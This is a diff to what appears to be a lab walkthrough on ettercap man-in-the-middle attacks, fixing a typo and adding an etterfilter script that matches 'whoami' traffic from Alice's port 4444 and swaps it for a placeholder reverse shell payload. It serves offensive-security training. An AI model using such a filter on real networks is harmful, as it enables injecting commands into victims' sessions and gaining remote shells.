@@ -782,7 +782,7 @@ prints the help screen with a short summary of the available options.
 
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 
-                        (For syntax & functions visit the mac page:  (http://linux.die.net/man/8/etterfilter)
+                        (For syntax & functions visit the man page:  (http://linux.die.net/man/8/etterfilter)
 
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 
@@ -790,15 +790,19 @@ prints the help screen with a short summary of the available options.
 
 - Now, create a new **etterfilter code file** named `whoami.ecf` and try to **write a filter matching Alice's source port and transport protocol** as well as **replacing whoami data with a reverse shell payload** of your choice.
 
-- 
+- Now, create a new etterfilter code file named `whoami.ecf` and try to write a filter matching **Alice's source port** and **transport protocol** as well as replacing `whoami` data with a **`reverse shell payload`** of your choice.
 
-
+- In the end, your filter might look similar to this one, where **`<reverse_shell>`** contains the reverse shell payload you chose:
 
 ```
 
-- Now, create a new etterfilter code file named `whoami.ecf` and try to write a filter matching **Alice's source port** and **transport protocol** as well as replacing `whoami` data with a **`reverse shell payload`** of your choice.
+if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/root/ettercap.log");
+    replace("whoami", "<-..+++_reverse_shell_+++..->" );
+    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
+}
 
-
+```
 
 ---
 
